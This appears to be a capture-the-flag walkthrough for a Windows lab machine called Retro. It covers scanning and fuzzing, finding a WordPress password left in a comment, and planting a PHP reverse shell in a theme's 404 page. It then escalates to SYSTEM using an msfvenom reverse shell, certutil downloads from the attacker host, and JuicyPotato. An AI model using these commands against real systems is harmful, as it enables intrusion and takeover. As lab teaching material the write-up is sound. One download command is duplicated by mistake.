### Scanning

Starting with scanning our target and do not forget to use the **-Pn** flag as the machine does not respond to ping (ICMP)

```
# Nmap 7.94SVN scan initiated Thu Mar  6 10:33:05 2025 as: nmap -A -p- -T4 -Pn -oN RetroScan 10.10.199.58

We will see that there is http port on our target so let's see it

_Website_

it is the default windows server welcoming page so nothing interesting here so we need to dig deeper.

### Website Discovery

It appears from the first question that the website is live on some hidden directory so we need to do directory fuzzing on our website.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.199.58/FUZZ' 
```

We can see that there is a directory called Retro which the website is live on.

![img-description](/assets/img/Retro/DirFuzzing.png)
_Hidden Dir_

So let's explore our website, our website is about someone called **Wade** and he is posting about some games that he love

![img-description](/assets/img/Retro/Retro.png)
_Retro_

i clicked on his username to explore more about him and when scrolling down i found that there is some sort of a login page

![img-description](/assets/img/Retro/Login.png)
_Login_

i clicked on it and it is a wordpress login page which seems to have a problem, the problem is when i tried to enter default credentials it tells me **invalid username** this means that we can enumerate users using this login page.

![img-description](/assets/img/Retro/wp-login.png)
_wp-login_

i have tried the username wade and it also told me that the user wade is exists but i have the wrong password, so now we need to find the right password.

![img-description](/assets/img/Retro/User.png)
_wade_

when i was seeing the psots in the website i found the second one is interesting, wade is saying that he loves the movie called Ready Player one and that he is mistyping the the name of his avatar when he log in.

![img-description](/assets/img/Retro/RPO.png)
_movie_

so i have clicked on the post to see if there is more details about it and i have found that he wrote the password in plaintext in a comment.

_Password_

### Gaining Access

as we now have access on the admin panel we can easily gain access to the server you can search for how to get a reverse shell from wp admin panel and you will see the steps of it, so let's see how can we do this.

follow the steps in the following image after you enter the credentials we found.

![img-description](/assets/img/Retro/Shell.png)
_Reverse Shell_

let's explain what we are doing, we are now trying to access the 404 page and we can see that it is a php code so we need to find a php reverse shell for windows we will find this on [Github](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) we now will need to change the php code of the page with the reverse shell php code **after changing our ip and port that we need to recieve the reverse shell back on it**, and open a nc listener with the port you have entered in the code and wait for the connection

```
nc -nlvp 4444
```

after doing this we now should go to the cmd and type this command to access the 404.php page

```
curl -X GET "http://10.10.244.143/retro/wp-content/themes/90s-Retro/404.php"
```

it will execute the shell and we will see that we have access on the server now.

_Server Access_

#### User Flag

if we tried to access the user wade to get our user flag we will find that it is inaccessable, but as we now have his credentials we can try to access the user wade via rdp.

```
xfreerdp /u:wade /v:[your machine ip] /p:parzival
```

you can see that we have user access now and the flag is on the desktop

_User access_

### Privilege Escalation

#### Privileges Enum

In order to escalate our privilege first thing i will do is see what are my privileges on the system, if we see the user wade we will not see much but on the server account there is an interesting one.

![img-description](/assets/img/Retro/priv.png)
_Priv_

We will find that i have the **SeImpersonatePrivilege** Enabled

We will use a tool called **JuicyPotato** to abuse the SeImpersonatePrivilege by creating a malicious token and impersonating it to escalate to SYSTEM.

You can find it here [JuicyPotato](https://github.com/ohpe/juicy-potato/releases)

#### Root Access

we will also need a shell to connect back to our machine to give us the system access.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Yourip> LPORT=<Yourport> -f exe -o shell.exe
```

Now to get the root access we will upload the two files to our machine via opening http server on the same directory we have the tool in.

```
python3 -m http.server
```

then use this command for transfering the files **Note: do not forget to do this in the C:\Users\Public> in order for everything to work**

```
certutil -urlcache -f http://<Yourip>:8080/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -f http://<Yourip>:8080/JuicyPotato.exe JuicyPotato.exe
```

Now let's execute our tool to see if we can get access, the -c flag specifies the Class ID, or CLSID it is a serial number that represents a unique ID for any application component in Windows, and it is different from os to another i have tried many of them but this is the one which worked with me.

```
JuicyPotato.exe -l 1111 -p shell.exe -t * -c {4661626C-9F41-40A9-B3F5-5580E80CB347}
```
now open a listener to receive the system shell.

![img-description](/assets/img/Retro/Root.png)
_Root Access_

And now we have our root flag

```
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
7958b569565d7bd88d10c6**********
```
